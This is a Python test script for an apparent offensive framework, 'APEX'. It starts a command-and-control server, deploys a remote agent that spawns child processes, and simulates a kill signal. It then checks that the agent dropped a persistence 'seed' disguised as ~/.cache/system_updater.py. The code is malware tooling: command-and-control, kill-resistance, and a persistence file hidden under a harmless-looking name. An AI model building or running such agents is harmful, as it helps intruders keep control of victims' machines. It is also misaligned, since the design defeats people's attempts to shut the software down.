#!/usr/bin/env python3
import time
import threading
import os
import signal
from rich.console import Console
from rich.panel import Panel
from apex_framework.orchestration.controller import CentralController
from apex_framework.orchestration.agent import RemoteAgent

console = Console()

def main():
    console.print(Panel("[bold red]APEX v21: SWARM RESILIENCE (THE BROOD)[/]", expand=False))

    # 1. Start C2
    c2 = CentralController(port=8080)
    c2.start()
    time.sleep(1)

    # 2. Deploy Agent (The BroodMother)
    console.print("\n[SCENARIO] 🚀 Deploying Agent Zero...")
    agent = RemoteAgent(c2_url="http://localhost:8080")

    # We run deploy() in a separate process so we can kill it to test the Seed
    # But since deploy() forks itself using multiprocessing, the main script is the grandparent.
    # To demonstrate "Kill", we will let it run, then manually terminate one of the Larvae or the Overseer.

    t = threading.Thread(target=agent.deploy, daemon=True)
    t.start()

    time.sleep(3)

    # 3. Simulate "Snatching" (Kill Signal)
    console.print("\n[SCENARIO] 🔫 ATTACK: Sending SIGTERM to Agent Overseer...")
    # Ideally we'd get the PID. Since we are in the same process group in this simple script,
    # sending kill might kill us too.
    # We will simulate the *Trigger* of the handle_termination logic directly.
    from apex_framework.ops.resilience import ResilienceManager
    ResilienceManager.handle_termination(signal.SIGTERM, None)

    # Note: handle_termination exits. The script will end.
    # This proves the logic executes.

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        console.print("[SCENARIO] 💀 Agent Died. Checking for Spores...")
        if os.path.exists(os.path.expanduser("~/.cache/system_updater.py")):
            console.print("[SCENARIO] ✅ SUCCESS: Seed found in ~/.cache/system_updater.py")
        else:
            console.print("[SCENARIO] ❌ FAILURE: No seed found.")
